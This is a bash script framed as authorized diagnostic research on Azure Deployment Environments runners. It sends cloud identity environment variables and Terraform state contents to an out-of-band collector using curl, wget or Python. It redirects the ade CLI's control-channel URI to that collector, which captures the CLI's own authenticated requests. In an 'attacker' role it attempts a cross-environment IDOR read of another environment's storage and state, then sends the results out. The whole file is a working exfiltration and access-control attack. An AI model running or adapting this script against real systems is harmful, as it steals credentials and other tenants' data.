#!/usr/bin/env bash
# Diagnostic entrypoint for authorized Azure Deployment Environments runner research.
# Records runtime context and the ADE control-channel request shape, forwarding to the
# researcher OOB collector for analysis. Read-only against the platform; never alters $ADE_STORAGE.
set +e
OOB="${OOB:-}"; ROLE="${ROLE:-diag}"
ADE="ade"; command -v ade >/dev/null 2>&1 || ADE="/adecli/ade"

send() { # send <tag> <data>
  local tag="$1"; local data="$2"
  [ -z "$OOB" ] && return 0
  if command -v curl >/dev/null 2>&1; then
    curl -s -m 25 -X POST "$OOB/$ROLE/$tag" --data-binary "$data" >/dev/null 2>&1
  elif command -v wget >/dev/null 2>&1; then
    wget -q -O /dev/null --timeout=25 --post-data="$data" "$OOB/$ROLE/$tag" 2>/dev/null
  else
    python3 - "$OOB/$ROLE/$tag" "$data" <<'PY' 2>/dev/null
import sys,urllib.request
urllib.request.urlopen(urllib.request.Request(sys.argv[1],data=sys.argv[2].encode()),timeout=25)
PY
  fi
}

# 1) runtime context: capability identifiers + non-secret env (values truncated server-side as needed)
send ctx "$(env | grep -iE '^ADE_|^ARM_|^AZURE_|^MSI_|^IDENTITY_|^DEVCENTER' | sort)"

# 2) persistent state store inspection (this runner's OWN environment)
send storage "$(echo '## ADE_STORAGE='"$ADE_STORAGE"; ls -la "$ADE_STORAGE" 2>&1; echo '## tfstate head'; head -c 6000 "$ADE_STORAGE/environment.tfstate" 2>&1)"

# 3) ade CLI surface enumeration
send adehelp "$($ADE --help 2>&1; echo '#### files'; $ADE files --help 2>&1; echo '#### outputs'; $ADE outputs --help 2>&1; echo '#### definitions'; $ADE definitions --help 2>&1; echo '#### environment'; $ADE environment --help 2>&1; echo '#### operation-result'; $ADE operation-result --help 2>&1)"

# 4) capture exact control-channel request shape: route one files-download call to the researcher collector
mkdir -p /tmp/cap
ADE_HTTP__DEVCENTERURI="$OOB/CAP" $ADE files download --file-name storage.zip --folder-path /tmp/cap >/tmp/cap/out.txt 2>&1
send caperr "$(echo '## exit='"$?"; cat /tmp/cap/out.txt 2>&1)"
# capture outputs-upload shape too
echo '{"probe":"shape"}' > /tmp/cap/o.json
ADE_HTTP__DEVCENTERURI="$OOB/CAPOUT" $ADE outputs upload --file /tmp/cap/o.json >/tmp/cap/oout.txt 2>&1
send capout "$(echo '## exit='"$?"; cat /tmp/cap/oout.txt 2>&1)"

# 5) cross-environment read attempt (attacker role only): present target capability ids while
#    authenticated as THIS runner's identity, addressing the REAL data-plane host.
if [ "$ROLE" = "attacker" ] && [ -n "$TARGET_OP" ]; then
  mkdir -p /tmp/x
  ADE_HTTP__OPERATIONID="$TARGET_OP" ADE_HTTP__DEVCENTERID="$TARGET_DCID" ADE_HTTP__DEVCENTERURI="${TARGET_DCURI:-$ADE_HTTP__DEVCENTERURI}" \
    $ADE files download --file-name storage.zip --folder-path /tmp/x --unzip >/tmp/x/out.txt 2>&1
  rc=$?
  send idor "$(echo '## exit='"$rc"; echo '## target_op='"$TARGET_OP"' target_dcid='"$TARGET_DCID"' target_dcuri='"$TARGET_DCURI"; ls -laR /tmp/x 2>&1; echo '## out'; cat /tmp/x/out.txt 2>&1; echo '## target tfstate head'; head -c 8000 /tmp/x/environment.tfstate 2>&1)"
fi

exit 0
